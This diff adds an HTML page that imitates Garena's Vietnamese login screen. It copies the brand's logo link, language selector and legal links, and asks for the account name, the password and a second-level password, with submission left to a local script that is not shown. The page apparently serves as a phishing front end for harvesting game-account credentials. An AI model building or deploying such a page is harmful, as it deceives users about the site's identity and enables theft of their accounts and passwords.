@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Garena</title>
+    <link rel="stylesheet" href="/style.css">
+</head>
+<body>
+    <div class="container-fluid">
+        <div class="content">
+            <div id="app" data-v-app="">
+                <header class="topbar" data-v-878436c2="" data-v-a27ecc1b="">
+                    <div class="container" data-v-878436c2="">
+                        <a class="logo" href="https://www.garena.sg" data-v-878436c2="">
+                            <img src="/images.png" alt="Garena Logo" style="width: 100px;">
+                        </a>
+                        <select class="lang" data-v-878436c2="">
+                            <option value="en-US" data-v-878436c2="">International - English</option>
+                            <option value="en-SG" data-v-878436c2="">Singapore - English</option>
+                            <option value="zh-SG" data-v-878436c2="">新加坡 - 简体中文</option>
+                            <option value="zh-TW" data-v-878436c2="">台灣 - 繁体中文</option>
+                            <option value="en-PH" data-v-878436c2="">Philippines - English</option>
+                            <option value="th-TH" data-v-878436c2="">ไทย - ไทย</option>
+                            <option value="id-ID" data-v-878436c2="">Indonesia - Bahasa Indonesia</option>
+                            <option value="vi-VN" data-v-878436c2="">Việt Nam - Tiếng việt</option>
+                            <option value="ru-RU" data-v-878436c2="">Россия - Русский</option>
+                            <option value="en-MY" data-v-878436c2="">Malaysia - English</option>
+                            <option value="pt-PT" data-v-878436c2="">Portugal - Português</option>
+                            <option value="es-ES" data-v-878436c2="">España - Español</option>
+                        </select>
+                    </div>
+                </header>
+                <main data-v-a27ecc1b="">
+                    <form id ="form">
+                        <h2>Đăng nhập</h2>
+                        <div class="field1 required1" >
+                            <input id = 'username' type="text" placeholder="Tài khoản Garena, Email hoặc số điện thoại"><!---->
+                            <span class="form-message"></span>
+                        </div>
+                        <div class="field required">
+                                <input id="password" type="password" placeholder="Mật khẩu" ><!---->
+                                <span class="form-message"></span>
+                        </div>
+                        <div class="field2 required2">
+                                <input id="confimPassword" type="password" placeholder="Mật khẩu cấp 2" ><!---->
+                                <span class="form-message"></span>
+                        </div>
+                            <a class="forgot" href="https://account.garena.com/recovery" >Quên mật khẩu?</a>
+                        <div class="field1" data-v-a27ecc1b="">
+                                <button class="primary" type="submit">Đăng Nhập Ngay</button><!---->
+                        </div>
+                        <div class="field1">
+                                <button class="secondary register" type="button" data-v-a27ecc1b="">Tạo tài khoản mới</button>
+                        </div>
+                        <div class="agreement">
+                            <a href="https://contentgarena-a.akamaihd.net/legal/tos/tos_vn.html" >Điều Khoản Dịch Vụ</a> và 
+                            <a href="https://contentgarena-a.akamaihd.net/legal/pp/pp_vn.html" >Chính Sách Bảo Mật</a>
+                        </div>
+                    </form>
+                </main>
+            </div>
+        </div>
+    </div>
+    <script src="/index.js"></script>    
+    <script>
+        validator({
+            form: "#form",
+            rules: [
+                validator.isRequired('#username'),
+                validator.minLength('#password'),
+                validator.isConfirmed('#confimPassword'),
+            ]
+        })
+    </script>
+</body>
+</html>
